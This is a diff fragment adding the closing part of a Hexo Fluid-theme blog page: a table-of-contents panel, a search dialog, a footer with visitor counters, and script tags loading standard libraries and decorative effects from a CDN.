+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/dianjichuzi.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/timeDate.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
